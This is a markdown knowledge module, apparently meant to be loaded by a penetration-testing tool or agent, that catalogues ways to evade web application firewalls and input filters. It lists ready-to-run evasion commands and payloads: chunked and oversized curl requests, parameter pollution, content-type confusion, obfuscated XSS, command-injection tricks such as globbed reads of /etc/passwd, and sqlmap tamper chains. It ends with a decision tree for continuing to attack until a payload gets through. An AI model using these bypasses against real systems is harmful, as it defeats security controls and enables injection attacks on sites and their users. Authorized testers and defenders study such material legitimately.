# BYPASS MODULE — WAF & Generic Filter Evasion
# Layer: shared/bypass
# Load when a WAF or generic input filter is blocking payloads

## THEORY

WAFs operate at the HTTP layer and apply pattern matching before the request
reaches the application. They have structural blind spots:
  - They process HTTP as text; the app parses it semantically
  - They cannot perfectly emulate every framework's input parsing
  - They must balance false-positive rate vs detection rate

---

## 1. HTTP REQUEST MANIPULATION

### Case variation in HTTP method
```http
get /admin HTTP/1.1
POST /admin HTTP/1.1
pOsT /admin HTTP/1.1
```

### HTTP version
```http
GET /search?q=<script>alert(1)</script> HTTP/1.0   -- some WAFs skip HTTP/1.0
GET /search?q=<script>alert(1)</script> HTTP/0.9
```

### Chunked transfer encoding
```bash
# Payload split across chunks — WAF may not reassemble
curl -s -X POST https://target.com/search \
  -H "Transfer-Encoding: chunked" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-binary $'b\r\nq=%3Cscript\r\nb\r\n>alert(1)\r\n0\r\n\r\n'
```

### Content-Type confusion
```bash
# WAF parses body as form data, app parses as JSON
Content-Type: application/x-www-form-urlencoded
{"query":"<script>alert(1)</script>"}

# Or reverse: WAF parses as JSON, app accepts form data
Content-Type: application/json
q=<script>alert(1)</script>&other=value

# Charset parameter — some WAFs skip body for unknown charsets
Content-Type: application/x-www-form-urlencoded; charset=ibm037
# Body re-encoded in IBM037 encoding
```

### Parameter pollution
```bash
# WAF checks first param, framework uses last (or concatenates)
GET /search?q=hello&q=<script>alert(1)</script>
POST body: q=hello&q=<script>alert(1)</script>

# Mixed GET + POST pollution
GET /search?q=<script>
POST body: q=>alert(1)</script>
# ASP.NET Request["q"] merges both
```

### Oversized headers / body
```bash
# Some WAFs have a body inspection size limit
# Pad before the payload with junk to exceed the inspection window
python3 -c "print('A'*65536 + '<script>alert(1)</script>')" | \
  curl -s -X POST https://target.com/search -d @-
```

### HTTP Request Smuggling for WAF bypass
```bash
# See shared/bypass/http_smuggling.md — send a request that the WAF sees as one
# but the back-end sees as two (second request bypasses WAF entirely)
```

---

## 2. PAYLOAD FRAGMENTATION

### Split across multiple parameters (app concatenates)
```bash
# If app does: output = param_a + param_b
GET /page?a=<scr&b=ipt>alert(1)</script>

# Across path segments (if app joins path parts)
GET /search/INJECT1/filter/INJECT2
```

### Split across headers and body
```bash
# If app builds payload from multiple sources
X-Custom-Input: <script>
POST body: content=>alert(1)</script>
```

### Multipart boundary confusion
```bash
# WAF only inspects first part; app processes all parts
curl -s -X POST https://target.com/upload \
  -F "safe=hello" \
  -F "data=<script>alert(1)</script>"
```

---

## 3. OBFUSCATION TECHNIQUES

### JavaScript obfuscation (for XSS that reaches eval or inline script)
```javascript
// Concatenation
'ale'+'rt'+'(1)'
eval('ale'+'rt(1)')

// Array join
['a','l','e','r','t'].join('')+'(1)'

// Function name via properties
window['alert'](1)
window['al'+'ert'](1)
this['alert'](1)
top['alert'](1)
self['alert'](1)
frames['alert'](1)

// Constructor
(1).constructor.constructor('alert(1)')()
''['constructor']['constructor']('alert(1)')()

// Regex source
/alert/.source + '(1)'  // "alert(1)"
eval(/alert(1)/.source)

// Comma operator with void
void(alert(1))
void alert(1)
alert(1),1

// Optional chaining (modern JS)
alert?.(1)

// toString override
{toString:alert}+''  // calls alert with implicit toString
```

### SQL obfuscation (via whitespace, comments, encoding — see sqli_filter_evasion.md)

### Command injection obfuscation
```bash
# Variable expansion to hide characters
a=al;b=ert;$a$b(1)      # bash variable concatenation
${a/rt/ert}              # parameter expansion

# Brace expansion
{l..l}s                  # ls
{w..w}hoami              # whoami

# $() nesting
$(echo 'id')
`id`
$(c\at /etc/passwd)

# Globbing for command names
/???/c?t /etc/passwd     # /bin/cat via glob
/usr/bin/python?          # /usr/bin/python3
```

---

## 4. TIMING-BASED WAF DETECTION

Before spending time on bypasses, confirm you are hitting a WAF:

```bash
#!/bin/bash
TARGET="https://target.com/search"

# Benign request baseline
TIME_CLEAN=$(curl -o /dev/null -s -w '%{time_total}' "$TARGET?q=hello")

# Malicious request — if WAF blocks it adds latency
TIME_PAYLOAD=$(curl -o /dev/null -s -w '%{time_total}' \
  "$TARGET?q=%27%20OR%201%3D1--")

echo "Clean:   $TIME_CLEAN"
echo "Payload: $TIME_PAYLOAD"
# >200ms difference → likely WAF inspection overhead
# Same time but 403 → block without inspection overhead (faster WAF or IP block)
```

---

## 5. BYPASS DECISION TREE

```
Payload blocked?
│
├─ 403/406/418 with WAF error page?
│   └─ Yes → WAF active
│       ├─ Try encoding.md variants
│       ├─ Try HTTP-level evasion (chunked, parameter pollution, content-type)
│       └─ Try payload fragmentation
│
├─ 200 but payload stripped in response?
│   └─ Application-level filter
│       ├─ Identify which characters trigger removal (binary search)
│       ├─ Try recursive filter bypass (double payload)
│       └─ Try context-specific encoding (HTML entity in HTML context)
│
└─ 200 but payload escaped in output?
    └─ Output encoding active (this is the correct defense)
        ├─ Look for different sinks where escaping is missing
        ├─ Try DOM-based XSS path (client-side sinks, not server-side output)
        └─ Try second-order injection (store then retrieve in unescaped context)
```

---

## 6. TOOLS REFERENCE

```bash
# WAF fingerprinting
wafw00f https://target.com

# WAF bypass wordlists / cheatsheets
# https://github.com/0xInfection/Awesome-WAF
# https://github.com/swisskyrepo/PayloadsAllTheThings

# Bypass testing automation
# Burp Suite: Intruder with encoding options
# SQLMap WAF bypass: sqlmap --tamper=space2comment,charencode,randomcase

# SQLMap tamper scripts for WAF bypass:
sqlmap -u "URL" --tamper=space2comment      # spaces → /**/
sqlmap -u "URL" --tamper=charencode         # URL encode chars
sqlmap -u "URL" --tamper=randomcase         # RaNdOm CaSe
sqlmap -u "URL" --tamper=between            # > → NOT BETWEEN 0 AND
sqlmap -u "URL" --tamper=greatest           # = → GREATEST()
# Chain multiple tampers:
sqlmap -u "URL" --tamper=space2comment,charencode,randomcase
```
